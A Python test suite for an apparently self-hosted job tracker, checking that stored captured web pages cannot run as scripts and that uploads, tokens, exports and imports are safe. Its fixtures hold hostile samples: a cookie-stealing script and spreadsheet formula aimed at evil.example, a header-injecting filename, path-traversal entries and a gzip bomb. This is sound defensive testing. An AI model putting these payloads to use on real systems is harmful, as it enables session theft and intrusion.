"""\"I'll get Postulo to run the page it kept, or to hand me somebody else's.\" (#256)

A capture may keep the page it was read from: the source, and a rendering. The source is
a stranger's markup, stored on this server and looked at later by the person signed in to
it, which is the shape of every stored cross-site script there has ever been. What stands
between the two is that the source is never answered as a page -- and these are the tests
that say so, by asking for it every way there is and reading what comes back.

The rest is what an attacker with less would try: another account asking for the file, a
token without the scope sending one, an upload too large to be read, a document dressed as
a picture, an archive that lies about what it holds.
"""

from __future__ import annotations

import csv
import gzip
import io
import json
import re
import zipfile
from pathlib import Path

import pytest
from django.conf import settings
from django.urls import get_resolver, reverse

from postulo.api.models import ApiToken
from postulo.core import export as export_module
from postulo.core import importer, site
from postulo.core.models import SiteSettings
from postulo.jobs import pages
from postulo.jobs.models import Capture, CapturedPage, CaptureStatus

pytestmark = pytest.mark.django_db

#: A page that would do three things if anything drew it: run a script, fetch an image,
#: and post the reader's cookie to somebody.
HOSTILE = (
    "<!doctype html><html><head><title>A role</title>"
    "<script>document.location='https://evil.example/?'+document.cookie</script>"
    '<script type="application/ld+json">'
    '{"@context":"https://schema.org/","@type":"JobPosting","title":"A role",'
    '"hiringOrganization":{"name":"Evil Corp"}}</script></head>'
    '<body onload="alert(1)"><img src="https://evil.example/pixel.png">'
    "<h1>A role</h1></body></html>"
)

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
PDF = b"%PDF-1.7\n" + b"%" * 64

#: Every media type a browser would draw as a document rather than save or show as text.
DOCUMENTS = ("text/html", "application/xhtml+xml", "image/svg+xml", "text/xml", "application/xml")


@pytest.fixture(autouse=True)
def _a_media_directory_of_its_own(settings, tmp_path):
    settings.MEDIA_ROOT = str(tmp_path / "media")


def keep_everything(*people) -> None:
    SiteSettings.objects.update_or_create(
        pk=1, defaults={"capture_keep_source": True, "capture_keep_rendering": True}
    )
    site.forget_current()
    for person in people:
        profile = person.profile
        profile.keep_page_source = True
        profile.keep_page_rendering = True
        profile.save(update_fields=["keep_page_source", "keep_page_rendering"])


def a_capture(owner, **fields) -> Capture:
    return Capture.objects.create(
        owner=owner,
        url="https://example.org/j/7",
        data={"title": "A role", "company_name": "Evil Corp"},
        **fields,
    )


def issue(user, *scopes) -> dict:
    _record, raw = ApiToken.issue(user, "Agent", scopes=scopes or ("captures",))
    return {"HTTP_AUTHORIZATION": f"Bearer {raw}"}


def put(client, pk, body=PNG, content_type="image/png", **headers):
    return client.put(
        f"/api/v1/captures/{pk}/rendering", data=body, content_type=content_type, **headers
    )


@pytest.fixture
def kept(user):
    """One capture of a hostile page, with its source and a picture kept."""
    keep_everything(user)
    capture = a_capture(user)
    pages.keep_source(capture, HOSTILE)
    pages.attach_rendering(capture, io.BytesIO(PNG), content_type="image/png", length=len(PNG))
    return capture


class MustNotBeRead:
    """A request body that fails the test the moment anything reads it."""

    def read(self, *args, **kwargs):
        raise AssertionError("the upload was read before it was refused")


# --------------------------------------------------------- the source is never a page


def addresses_naming(capture: Capture) -> list[str]:
    """Every address in Postulo that takes this capture's id, pages and API alike."""

    def walk(resolver, prefix=""):
        for pattern in resolver.url_patterns:
            if hasattr(pattern, "url_patterns"):
                namespace = pattern.namespace or ""
                yield from walk(pattern, f"{prefix}{namespace}:" if namespace else prefix)
            elif pattern.name and "capture" in pattern.name + str(pattern.pattern):
                yield f"{prefix}{pattern.name}"

    found = []
    for name in sorted(set(walk(get_resolver()))):
        try:
            found.append(reverse(name, kwargs={"pk": capture.pk}))
        except Exception:  # noqa: S112 - an address that takes no id names no capture
            continue
    return found


def test_there_are_addresses_to_ask(kept):
    """A sweep that found nothing would pass everything below."""
    found = addresses_naming(kept)

    assert reverse("jobs:capture_page_source", args=[kept.pk]) in found
    assert reverse("jobs:capture_page", args=[kept.pk]) in found
    assert len(found) >= 6


def test_no_address_answers_the_kept_source_as_a_document(client, kept):
    """The rule #218 set, applied with force: a stranger's markup, stored and later drawn
    from this origin, is that stranger's code running as the person who opened it.

    Every address that names the capture is asked, signed in as its owner and with every
    scope a token can hold. An answer may quote the source as text inside one of Postulo's
    own pages, escaped; it may hand it over as `text/plain`. What it may never be is the
    source itself under a type a browser draws.
    """
    client.force_login(kept.owner)
    bearer = issue(kept.owner, "captures", "read", "write", "documents:read")

    for address in addresses_naming(kept):
        for headers in ({}, bearer):
            response = client.get(address, **headers)
            kind = response.headers.get("Content-Type", "").split(";")[0].strip().lower()
            body = b"".join(response.streaming_content) if response.streaming else response.content
            if b"document.location='https://evil.example" not in body:
                continue
            assert kind == "text/plain", f"{address} answered the source as {kind!r}"
            assert response["Content-Disposition"].startswith("attachment;"), address
            assert response["X-Content-Type-Options"] == "nosniff", address


def test_the_download_is_text_an_attachment_and_not_to_be_sniffed(client, kept):
    client.force_login(kept.owner)

    response = client.get(reverse("jobs:capture_page_source", args=[kept.pk]))

    assert response.status_code == 200
    assert response["Content-Type"] == "text/plain; charset=utf-8"
    assert response["Content-Disposition"].startswith("attachment;")
    assert ".txt" in response["Content-Disposition"]
    assert ".htm" not in response["Content-Disposition"].lower()
    assert response["X-Content-Type-Options"] == "nosniff"
    assert "sandbox" in response["Content-Security-Policy"]
    assert "default-src 'none'" in response["Content-Security-Policy"]
    assert "no-store" in response["Cache-Control"]
    assert response.content.decode() == HOSTILE, "and it is exactly what was parsed"


def test_a_stranger_cannot_name_the_download(client, user):
    """The title is read off their page and goes into a header of ours."""
    keep_everything(user)
    capture = a_capture(user)
    capture.data = {"title": 'x.html"\r\nContent-Type: text/html\r\n\r\n<script>'}
    capture.save()
    pages.keep_source(capture, HOSTILE)
    client.force_login(user)

    response = client.get(reverse("jobs:capture_page_source", args=[capture.pk]))

    assert response["Content-Type"] == "text/plain; charset=utf-8"
    disposition = response["Content-Disposition"]
    assert "\r" not in disposition and "\n" not in disposition
    assert "<" not in disposition and "script" not in disposition.replace("-script", "")
    assert re.search(r'filename="[a-z0-9-]+-source\.txt"', disposition)


def test_the_page_that_shows_the_source_shows_it_as_text(client, kept):
    client.force_login(kept.owner)

    response = client.get(reverse("jobs:capture_page", args=[kept.pk]))
    html = response.content.decode()

    assert response["Content-Type"].startswith("text/html"), "one of Postulo's own pages"
    assert "&lt;script&gt;document.location=" in html, "the source, escaped"
    assert "<script>document.location=" not in html
    assert 'onload="alert(1)"' not in html
    assert "https://evil.example/pixel.png" not in html.replace(
        "&quot;https://evil.example/pixel.png&quot;", ""
    ), "and the image it named is not one this page asks for"


def test_the_page_puts_the_source_in_no_frame(client, kept):
    """Not in a frame, not in an object, not in an embed: there is nothing to sandbox."""
    client.force_login(kept.owner)

    html = client.get(reverse("jobs:capture_page", args=[kept.pk])).content.decode()
    shown = html[html.index("data-captured-page") : html.index("</main>")]

    assert not re.search(r"<(iframe|frame|object|embed)\b", shown)
    assert "srcdoc" not in shown


def test_no_template_of_the_kept_page_switches_escaping_off():
    root = Path(__file__).resolve().parents[2] / "src" / "postulo" / "templates" / "jobs"
    for name in ("capture_page.html", "capture_page_forget.html"):
        text = (root / name).read_text(encoding="utf-8")
        assert "|safe" not in text and "autoescape off" not in text, name
        assert "mark_safe" not in text, name


def test_nothing_in_postulo_serves_the_kept_source_through_the_file_helper():
    """`serve_private_file` guesses a media type from a name. The source goes through
    `serve_private_text`, which has no type to guess, and through nothing else."""
    root = Path(__file__).resolve().parents[2] / "src" / "postulo"
    views = (root / "jobs" / "page_views.py").read_text(encoding="utf-8")

    assert "serve_private_text(" in views
    assert not re.search(r"serve_private_file\([^)]*\.source\b", views, re.S)
    for path in root.rglob("*.py"):
        text = path.read_text(encoding="utf-8")
        assert not re.search(r"serve_private_file\([^)]*page\.source\b", text, re.S), path.name


def test_the_kept_file_is_not_named_as_a_page_on_the_disk(kept):
    """A web server pointed at the media directory by mistake answers `x.html.gz` as a
    gzipped page. There is no such file to answer."""
    root = Path(settings.MEDIA_ROOT)
    names = [path.name.lower() for path in root.rglob("*") if path.is_file()]

    assert names, "something was kept"
    assert not [name for name in names if ".htm" in name or name.endswith((".svg", ".xml"))]
    assert kept.page.source.name.endswith(".txt.gz")


def test_the_media_directory_is_still_not_served(client, kept):
    client.force_login(kept.owner)

    for held in (kept.page.source, kept.page.rendering):
        assert client.get(f"/{settings.MEDIA_URL}{held.name}").status_code == 404
        assert client.get(f"/media/{held.name}").status_code == 404


# ------------------------------------------------------------ the rendering is a picture


def test_the_rendering_is_answered_as_the_kind_it_was_kept_as(client, kept):
    client.force_login(kept.owner)

    response = client.get(reverse("jobs:capture_page_rendering", args=[kept.pk]))

    assert response["Content-Type"] == "image/png"
    assert response["X-Content-Type-Options"] == "nosniff"
    assert "sandbox" in response["Content-Security-Policy"]
    assert b"".join(response.streaming_content) == PNG


@pytest.mark.parametrize("kind", [*DOCUMENTS, "text/plain", "application/octet-stream", ""])
def test_a_document_is_not_a_rendering(client, user, kind):
    """HTML and SVG are documents: drawn from here, they run as the person looking."""
    keep_everything(user)
    capture = a_capture(user)

    response = put(client, capture.pk, HOSTILE.encode(), kind or "image/png;", **issue(user))

    if kind:
        assert response.status_code == 415, response.content
        assert response.json()["type"].endswith("#unsupported-media-type")
        assert "image/png" in response.json()["accepted"]
    else:
        assert response.status_code == 422, "declared a picture, and is not one"
    assert not CapturedPage.objects.exists()


@pytest.mark.parametrize(
    ("declared", "body"),
    [
        ("image/png", HOSTILE.encode()),
        ("image/png", b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"),
        ("image/jpeg", PNG),
        ("image/webp", b"RIFF\x00\x00\x00\x00WAVEfmt "),
        ("application/pdf", b"<html><body>%PDF-1.7</body></html>"),
        ("application/pdf", b" %PDF-1.7"),
    ],
    ids=["html as png", "svg as png", "png as jpeg", "wav as webp", "html as pdf", "padded pdf"],
)
def test_a_file_that_is_not_what_it_was_sent_as_is_refused(client, user, declared, body):
    """The declaration is all that says what a file is answered as, so it has to be true."""
    keep_everything(user)
    capture = a_capture(user)

    response = put(client, capture.pk, body, declared, **issue(user))

    assert response.status_code == 422, response.content
    assert response["Content-Type"] == "application/problem+json"
    assert not CapturedPage.objects.exists()
    assert not list(Path(settings.MEDIA_ROOT).rglob("*.*")), "and nothing reached the disk"


def test_a_kind_changed_in_the_database_is_not_believed(client, kept):
    """The media type is one of four or the file is not served at all."""
    CapturedPage.objects.filter(pk=kept.page.pk).update(rendering_type="text/html")
    client.force_login(kept.owner)

    response = client.get(reverse("jobs:capture_page_rendering", args=[kept.pk]))

    assert response.status_code == 404


def test_a_refusal_quotes_what_was_declared_and_no_more_of_it(client, user):
    keep_everything(user)
    capture = a_capture(user)
    declared = "text/html" + "x" * 500

    response = put(client, capture.pk, b"<html>", declared, **issue(user))

    assert response.status_code == 415
    assert len(response.json()["detail"]) < 200


# ------------------------------------------------------------------ somebody else's


def test_another_account_cannot_fetch_either_file(client, kept, other_user):
    client.force_login(other_user)

    for name in ("capture_page", "capture_page_source", "capture_page_rendering"):
        response = client.get(reverse(f"jobs:{name}", args=[kept.pk]))
        assert response.status_code == 404, f"{name}: never a 403, which would confirm it"
        assert b"evil.example" not in response.content


def test_another_account_cannot_delete_or_redraw_it(client, kept, other_user):
    client.force_login(other_user)

    for name in ("capture_page_forget", "capture_page_draw"):
        assert client.post(reverse(f"jobs:{name}", args=[kept.pk])).status_code == 404

    assert CapturedPage.objects.filter(pk=kept.page.pk).exists()
    assert (Path(settings.MEDIA_ROOT) / kept.page.source.name).is_file()


def test_nobody_signed_out_reaches_any_of_it(client, kept):
    for name in (
        "capture_page",
        "capture_page_source",
        "capture_page_rendering",
        "capture_page_forget",
    ):
        response = client.get(reverse(f"jobs:{name}", args=[kept.pk]))
        assert response.status_code == 302 and "/accounts/login/" in response.url, name
    assert client.post(reverse("jobs:capture_page_draw", args=[kept.pk])).status_code == 302
    assert client.post(reverse("jobs:capture_page_forget", args=[kept.pk])).status_code == 302
    assert CapturedPage.objects.count() == 1


def test_another_accounts_token_cannot_send_a_rendering(client, user, other_user):
    keep_everything(user, other_user)
    capture = a_capture(user)

    response = put(client, capture.pk, **issue(other_user))

    assert response.status_code == 404
    assert not CapturedPage.objects.exists()


def test_an_administrator_sees_how_much_and_nothing_of_what(client, kept, other_user):
    other_user.is_staff = True
    other_user.is_superuser = True
    other_user.save()
    client.force_login(other_user)

    assert client.get(reverse("jobs:capture_page_source", args=[kept.pk])).status_code == 404
    assert client.get(reverse("jobs:capture_page_rendering", args=[kept.pk])).status_code == 404
    html = client.get(reverse("server:capture")).content.decode()
    assert 'data-kept-pages="1"' in html and "evil.example" not in html


def test_a_forged_request_cannot_delete_what_was_kept(kept):
    from django.test import Client

    browser = Client(enforce_csrf_checks=True)
    browser.force_login(kept.owner)

    response = browser.post(reverse("jobs:capture_page_forget", args=[kept.pk]))

    assert response.status_code == 403
    assert CapturedPage.objects.filter(pk=kept.page.pk).exists()


def test_a_page_asked_for_with_get_deletes_nothing(client, kept):
    """A link somebody was sent, or a prefetch: only a POST throws anything away."""
    client.force_login(kept.owner)

    client.get(reverse("jobs:capture_page_forget", args=[kept.pk]) + "?what=source")
    assert client.get(reverse("jobs:capture_page_draw", args=[kept.pk])).status_code == 405

    assert CapturedPage.objects.get().source


# --------------------------------------------------------------------- the scope


@pytest.mark.parametrize("scopes", [("read",), ("write",), ("documents:read",), ("read", "write")])
def test_a_token_without_the_captures_scope_cannot_attach_a_page(client, user, scopes):
    keep_everything(user)
    capture = a_capture(user)

    response = put(client, capture.pk, **issue(user, *scopes))

    assert response.status_code == 403
    body = response.json()
    assert body["type"].endswith("#insufficient-scope") and body["scope"] == "captures"
    assert not CapturedPage.objects.exists()


def test_a_token_without_the_scope_is_refused_before_the_upload_is_looked_at(client, user):
    """Whoever is not allowed to send one learns nothing about what would be taken."""
    keep_everything(user)
    capture = a_capture(user)

    response = put(
        client, capture.pk, HOSTILE.encode(), "text/html", **issue(user, "read", "write")
    )

    assert response.status_code == 403


def test_no_token_at_all_is_a_401_that_says_nothing(client, user):
    keep_everything(user)
    capture = a_capture(user)

    missing = put(client, capture.pk)
    unknown = put(client, 999_999)

    assert missing.status_code == unknown.status_code == 401
    assert missing.json()["detail"] == unknown.json()["detail"]


def test_a_token_that_can_send_a_page_cannot_read_one_back(client, kept):
    """An extension's token holds `captures` and nothing else. What a leak of it costs
    is a review queue to decline, and not a copy of every page somebody kept."""
    bearer = issue(kept.owner, "captures")

    for name in ("capture_page", "capture_page_source", "capture_page_rendering"):
        response = client.get(reverse(f"jobs:{name}", args=[kept.pk]), **bearer)
        assert response.status_code == 302, "a token is not a sign-in"
    listed = client.get("/api/v1/captures", **bearer).json()
    assert "evil.example" not in json.dumps(listed).replace("https://example.org", "")
    assert client.get(f"/api/v1/captures/{kept.pk}/rendering", **bearer).status_code == 405


# ------------------------------------------------------- measured before it is read


def test_an_oversized_upload_is_refused_before_it_is_read(user, settings):
    """The length the request declares is compared with the cap before a byte is taken."""
    keep_everything(user)
    settings.POSTULO_CAPTURE_RENDERING_MAX_BYTES = 1000
    capture = a_capture(user)

    with pytest.raises(pages.NotKept) as refused:
        pages.attach_rendering(capture, MustNotBeRead(), content_type="image/png", length=1001)

    assert refused.value.reason == "too-large" and refused.value.limit == 1000
    assert not CapturedPage.objects.exists()


def test_the_same_refusal_through_the_api_without_touching_the_body(
    client, user, settings, monkeypatch
):
    """Through the whole of the call: nothing between the socket and the refusal reads."""
    from django.core.handlers.wsgi import WSGIRequest

    keep_everything(user)
    settings.POSTULO_CAPTURE_RENDERING_MAX_BYTES = 1000
    capture = a_capture(user)

    def must_not_read(self, *args, **kwargs):
        raise AssertionError("the upload was read before it was refused")

    monkeypatch.setattr(WSGIRequest, "read", must_not_read)
    monkeypatch.setattr(WSGIRequest, "body", property(must_not_read))

    response = put(client, capture.pk, b"\x89PNG\r\n\x1a\n" + b"0" * 2000, **issue(user))

    assert response.status_code == 413
    body = response.json()
    assert response["Content-Type"] == "application/problem+json"
    assert body["type"].endswith("#too-large") and body["max_bytes"] == 1000
    assert not CapturedPage.objects.exists()


def test_every_other_refusal_comes_before_the_body_too(user, settings):
    """Switched off, already decided, the wrong kind, no room: none of them needs a byte."""
    capture = a_capture(user)
    arguments = {"content_type": "image/png", "length": 100}

    with pytest.raises(pages.NotKept, match="does not keep"):
        pages.attach_rendering(capture, MustNotBeRead(), **arguments)

    keep_everything(user)
    with pytest.raises(pages.NotKept) as kind:
        pages.attach_rendering(capture, MustNotBeRead(), content_type="text/html", length=100)
    assert kind.value.reason == "unsupported"

    with pytest.raises(pages.NotKept) as length:
        pages.attach_rendering(capture, MustNotBeRead(), content_type="image/png", length=None)
    assert length.value.reason == "no-length"

    settings.POSTULO_CAPTURE_ACCOUNT_MAX_BYTES = 50
    with pytest.raises(pages.NotKept) as room:
        pages.attach_rendering(capture, MustNotBeRead(), **arguments)
    assert room.value.reason == "no-room"

    decided = a_capture(user, status=CaptureStatus.ACCEPTED)
    with pytest.raises(pages.NotKept) as late:
        pages.attach_rendering(decided, MustNotBeRead(), **arguments)
    assert late.value.reason == "decided"


def test_a_length_that_lied_is_stopped_at_the_cap(user, settings):
    """Counted as it arrives: a request that said 100 and sent 5000 is not believed."""
    keep_everything(user)
    settings.POSTULO_CAPTURE_RENDERING_MAX_BYTES = 1000
    capture = a_capture(user)
    taken = []

    class Counting(io.BytesIO):
        def read(self, size=-1):
            chunk = super().read(size)
            taken.append(len(chunk))
            return chunk

    with pytest.raises(pages.NotKept) as refused:
        pages.attach_rendering(
            capture,
            Counting(b"\x89PNG\r\n\x1a\n" + b"0" * 500_000),
            content_type="image/png",
            length=100,
        )

    assert refused.value.reason == "too-large"
    assert sum(taken) <= 1000 + pages.CHUNK, "it stopped reading within a chunk of the cap"
    assert not CapturedPage.objects.exists()
    assert not list(Path(settings.MEDIA_ROOT).rglob("*.png"))


def test_an_upload_is_never_held_whole_in_memory(user, monkeypatch):
    """A piece at a time, to a file: what it weighs is the disk's business."""
    keep_everything(user)
    capture = a_capture(user)
    asked = []

    class Pieces(io.BytesIO):
        def read(self, size=-1):
            asked.append(size)
            return super().read(size)

    body = b"\x89PNG\r\n\x1a\n" + b"0" * (3 * pages.CHUNK)
    pages.attach_rendering(capture, Pieces(body), content_type="image/png", length=len(body))

    assert asked and all(0 < size <= pages.CHUNK for size in asked)
    assert CapturedPage.objects.get().rendering_size == len(body)


def test_a_slow_upload_does_not_hold_the_database(user):
    """On SQLite a request's transaction takes the write lock as it begins (#206), so an
    upload read off a slow connection inside one would stall every other request for as
    long as it took (#220). This call's request is not a transaction; the others' are."""
    from django.urls import resolve

    slow = resolve("/api/v1/captures/1/rendering").func
    # These two wait on the posting's own server when no `html` is sent (#357), and write in
    # short transactions of their own.
    fetching = [resolve("/api/v1/captures").func, resolve("/api/v1/captures/preview").func]

    assert getattr(slow, "_non_atomic_requests", set()) == {"default"}
    for view in fetching:
        assert getattr(view, "_non_atomic_requests", set()) == {"default"}
    assert not getattr(resolve("/api/v1/captures/1").func, "_non_atomic_requests", set())
    assert not getattr(resolve("/api/v1/me").func, "_non_atomic_requests", set())


def test_a_request_that_does_not_say_how_large_it_is_is_refused(client, user):
    keep_everything(user)
    capture = a_capture(user)

    response = client.generic(
        "PUT",
        f"/api/v1/captures/{capture.pk}/rendering",
        data=b"",
        content_type="image/png",
        **issue(user),
    )

    assert response.status_code in (411, 422)
    assert response["Content-Type"] == "application/problem+json"
    assert not CapturedPage.objects.exists()


def test_a_page_source_too_large_to_read_is_refused_as_a_problem_document(client, user):
    """The capture call itself. Django refused this before a byte was read, and answered
    with a page of HTML to a client that had sent JSON."""
    body = json.dumps({"url": "https://example.org/j/7", "html": "x" * 3_000_000})

    response = client.post(
        "/api/v1/captures", data=body, content_type="application/json", **issue(user)
    )

    assert response.status_code == 413
    assert response["Content-Type"] == "application/problem+json"
    answer = response.json()
    assert answer["type"].endswith("#too-large")
    assert answer["max_bytes"] == settings.DATA_UPLOAD_MAX_MEMORY_SIZE
    assert not Capture.objects.exists()


def test_a_source_over_the_cap_costs_the_page_and_not_the_capture(client, user, settings):
    keep_everything(user)
    settings.POSTULO_CAPTURE_SOURCE_MAX_BYTES = 50

    response = client.post(
        "/api/v1/captures",
        data=json.dumps({"url": "https://example.org/j/7", "html": HOSTILE}),
        content_type="application/json",
        **issue(user),
    )

    assert response.status_code == 201
    assert response.json()["page"]["source"] is False
    assert "was not kept" in response.json()["page"]["note"]
    assert not CapturedPage.objects.exists()


def test_one_token_cannot_fill_the_disk(client, user, settings):
    """The caps bound a file; this is what bounds the disk. A token that can capture can
    send a rendering with every capture, at the API's own rate."""
    keep_everything(user)
    settings.POSTULO_CAPTURE_ACCOUNT_MAX_BYTES = 3 * len(PNG)
    bearer = issue(user)

    answers = [put(client, a_capture(user).pk, **bearer).status_code for _ in range(6)]

    assert answers == [201, 201, 201, 409, 409, 409]
    assert pages.weight_of(user) <= settings.POSTULO_CAPTURE_ACCOUNT_MAX_BYTES


# ------------------------------------------------------------- what was kept is evidence


def test_a_rendering_is_not_replaced_from_outside(client, kept):
    """A token that leaked could otherwise swap the picture of an advert for another."""
    forged = b"\x89PNG\r\n\x1a\n" + b"\xff" * 64

    response = put(client, kept.pk, forged, **issue(kept.owner))

    assert response.status_code == 409
    assert response.json()["reason"] == "already-kept"
    page = CapturedPage.objects.get()
    assert (Path(settings.MEDIA_ROOT) / page.rendering.name).read_bytes() == PNG


@pytest.mark.parametrize("status", [CaptureStatus.ACCEPTED, CaptureStatus.DISCARDED])
def test_a_capture_that_has_been_decided_takes_nothing_more(client, user, status):
    """Once reviewed it is a record, and a record is not added to by a token."""
    keep_everything(user)
    capture = a_capture(user, status=status)

    response = put(client, capture.pk, **issue(user))

    assert response.status_code == 409
    assert response.json()["reason"] == "decided"
    assert not CapturedPage.objects.exists()


def test_a_request_cannot_switch_keeping_on(client, user):
    """Nothing a request says adds to what the instance and the person decided."""
    capture = a_capture(user)

    response = client.post(
        "/api/v1/captures",
        data=json.dumps(
            {"url": "https://example.org/j/7", "html": HOSTILE, "keep": {"source": True}}
        ),
        content_type="application/json",
        **issue(user),
    )

    assert response.status_code == 201
    assert put(client, capture.pk, **issue(user)).status_code == 409
    assert not CapturedPage.objects.exists()
    assert not list(Path(settings.MEDIA_ROOT).rglob("*.*"))


# ------------------------------------------------- foreign text, wherever it goes (#218)

FORMULA = '=HYPERLINK("https://evil.example/?"&A2,"Open me")'
CALENDAR = "x\r\nBEGIN:VALARM\r\nACTION:AUDIO\r\nTRIGGER:PT0S\r\nEND:VALARM"
FOREIGN = f"<html><body><p>{FORMULA}</p><p>{CALENDAR}</p><script>steal()</script></body></html>"


@pytest.fixture
def foreign(user):
    """A listing that came from a capture whose kept page is full of things to run."""
    from postulo.applications.models import Application, Status
    from postulo.applications.services import change_status
    from postulo.jobs.models import Company, JobPosting

    keep_everything(user)
    company = Company.objects.create(owner=user, name="Aperture Science")
    posting = JobPosting.objects.create(owner=user, company=company, title="Test Engineer")
    application = Application.objects.create(owner=user, posting=posting, status=Status.DRAFT)
    # Through the service, so that it has a date it was applied on and is in the report.
    change_status(application, Status.APPLIED)
    capture = a_capture(user, posting=posting, application=application)
    Capture.objects.filter(pk=capture.pk).update(status=CaptureStatus.ACCEPTED)
    pages.keep_source(capture, FOREIGN)
    return capture


def test_the_kept_page_reaches_no_spreadsheet(client, foreign):
    client.force_login(foreign.owner)

    text = client.get(reverse("applications:report_csv")).content.decode()

    cells = [cell for row in csv.reader(io.StringIO(text)) for cell in row]
    assert "Test Engineer" in cells, "the report is about the application"
    assert not any("HYPERLINK" in cell or "steal()" in cell for cell in cells)
    assert not any(cell.startswith(("=", "+", "-", "@", "\t", "\r")) for cell in cells)


def test_the_kept_page_reaches_no_calendar(client, foreign):
    from django.utils import timezone

    from postulo.applications.models import InterviewKind
    from postulo.applications.services import schedule_interview

    schedule_interview(foreign.application, kind=InterviewKind.VIDEO, starts_at=timezone.now())
    client.force_login(foreign.owner)

    text = client.get(reverse("applications:interview_calendar")).content.decode()

    assert "BEGIN:VEVENT" in text
    assert "VALARM" not in text and "HYPERLINK" not in text and "steal()" not in text


def test_the_archives_manifest_names_the_file_and_holds_none_of_it(foreign):
    """The manifest is a document other programs read. It says where the file is and
    what it hashes to; the page itself travels as the gzipped text it already is."""
    archive = zipfile.ZipFile(io.BytesIO(export_module.write_archive(foreign.owner).getvalue()))
    manifest = archive.read("postulo.json").decode()

    assert "HYPERLINK" not in manifest and "steal()" not in manifest
    assert "VALARM" not in manifest
    page = next(c["page"] for c in json.loads(manifest)["captures"] if c["page"])
    assert set(page) == {
        "source_file",
        "source_size",
        "source_checksum",
        "rendering_file",
        "rendering_type",
        "rendering_size",
        "rendering_checksum",
        "rendered_by",
        "kept_at",
    }
    assert page["source_file"].endswith(".txt.gz")
    names = [name.lower() for name in archive.namelist()]
    assert not [name for name in names if ".htm" in name or name.endswith(".svg")]
    assert gzip.decompress(archive.read(page["source_file"])).decode() == FOREIGN


def test_the_kept_page_is_in_no_answer_the_api_gives(client, foreign):
    bearer = issue(foreign.owner, "captures", "read", "write", "documents:read")
    pending = a_capture(foreign.owner)
    pages.keep_source(pending, FOREIGN)

    for address in (
        "/api/v1/captures",
        "/api/v1/listings",
        f"/api/v1/listings/{foreign.posting_id}",
        "/api/v1/applications",
        f"/api/v1/applications/{foreign.application_id}",
        "/api/v1/documents",
        "/api/v1/search?q=HYPERLINK",
        "/api/v1/search?q=steal",
    ):
        response = client.get(address, **bearer)
        assert response.status_code == 200, address
        assert "HYPERLINK" not in response.content.decode().replace("q=HYPERLINK", ""), address
        assert "steal()" not in response.content.decode(), address


def test_the_kept_page_is_not_what_a_notifier_is_told(client, user, monkeypatch):
    """A plugin hears that something arrived. It is not handed the page."""
    sent = []
    monkeypatch.setattr(
        "postulo.notifications.service.notify",
        lambda owner, notification: sent.append(
            notification() if callable(notification) else notification
        ),
    )
    keep_everything(user)

    response = client.post(
        "/api/v1/captures",
        data=json.dumps({"url": "https://example.org/j/7", "html": HOSTILE}),
        content_type="application/json",
        **issue(user),
    )

    assert response.status_code == 201 and CapturedPage.objects.count() == 1
    assert len(sent) == 1
    told = json.dumps(
        {
            "title": sent[0].title,
            "body": sent[0].body,
            "url": sent[0].url,
            "data": sent[0].data,
        },
        default=str,
    )
    assert "document.location" not in told and "evil.example" not in told


def test_a_kept_page_is_not_a_document_and_goes_to_no_store(kept):
    """External stores are sent documents. What a capture kept is not one of them."""
    from postulo.documents.models import DocumentCopy, RenderedDocument, UploadedDocument

    assert not UploadedDocument.objects.exists()
    assert not RenderedDocument.objects.exists()
    assert not DocumentCopy.objects.exists()


# ------------------------------------------------------------- an archive that lies


def archive_with(user, page: dict, files: dict[str, bytes]) -> zipfile.ZipFile:
    document = export_module.build_document(user)
    document["captures"] = [
        {
            "url": "https://example.org/j/7",
            "source_name": "schema.org",
            "source_version": "",
            "origin": "api",
            "status": "pending",
            "posting_id": None,
            "application_id": None,
            "data": {"title": "A role"},
            "page": page,
        }
    ]
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("postulo.json", json.dumps(document, default=str))
        for name, content in files.items():
            archive.writestr(name, content)
    return zipfile.ZipFile(io.BytesIO(buffer.getvalue()))


def test_an_archive_cannot_write_outside_the_importers_own_directory(user, other_user):
    keep_everything()
    climbing = f"media/captures/{user.pk}/../../../escaped.txt.gz"
    archive = archive_with(
        user,
        {
            "source_file": climbing,
            "rendering_file": "media/../../escaped.png",
            "rendering_type": "image/png",
        },
        {climbing: gzip.compress(b"<p>hello</p>"), "media/../../escaped.png": PNG},
    )

    importer.load(other_user, archive)

    root = Path(settings.MEDIA_ROOT).resolve()
    assert not (root.parent / "escaped.png").exists()
    assert not (root.parent / "escaped.txt.gz").exists()
    page = CapturedPage.objects.for_user(other_user).get()
    for held in (page.source, page.rendering):
        assert root / "captures" / str(other_user.pk) in (root / held.name).resolve().parents
        assert "escaped" not in held.name


def test_a_few_kilobytes_that_unpack_to_gigabytes_are_not_unpacked(user, other_user, settings):
    """A gzip bomb, in the place the source would be."""
    keep_everything()
    settings.POSTULO_CAPTURE_SOURCE_MAX_BYTES = 10_000
    bomb = gzip.compress(b"\x00" * 50_000_000)
    assert len(bomb) < 100_000
    archive = archive_with(
        user,
        {"source_file": "media/captures/1/bomb.txt.gz"},
        {"media/captures/1/bomb.txt.gz": bomb},
    )

    report = importer.load(other_user, archive)

    assert not CapturedPage.objects.exists()
    assert any("could read" in line for line in report.skipped)
    assert not list(Path(settings.MEDIA_ROOT).rglob("*.gz"))


def test_a_file_the_archive_says_is_too_large_is_not_read(user, other_user, settings):
    keep_everything()
    settings.POSTULO_CAPTURE_RENDERING_MAX_BYTES = 1000
    archive = archive_with(
        user,
        {"rendering_file": "media/captures/1/big.png", "rendering_type": "image/png"},
        {"media/captures/1/big.png": b"\x89PNG\r\n\x1a\n" + b"0" * 5000},
    )

    importer.load(other_user, archive)

    assert not CapturedPage.objects.exists()
    assert not list(Path(settings.MEDIA_ROOT).rglob("*.png"))


@pytest.mark.parametrize(
    ("kind", "body"),
    [
        ("text/html", HOSTILE.encode()),
        ("image/svg+xml", b"<svg xmlns='http://www.w3.org/2000/svg'/>"),
        ("image/png", HOSTILE.encode()),
        ("", PNG),
    ],
    ids=["html", "svg", "html called png", "nothing said"],
)
def test_an_archive_cannot_bring_in_a_document_as_a_rendering(user, other_user, kind, body):
    keep_everything()
    archive = archive_with(
        user,
        {"rendering_file": "media/captures/1/x.png", "rendering_type": kind},
        {"media/captures/1/x.png": body},
    )

    report = importer.load(other_user, archive)

    assert not CapturedPage.objects.exists()
    assert any("not a picture or a PDF" in line for line in report.skipped)


def test_what_an_archive_says_about_a_file_is_worked_out_again(user, other_user):
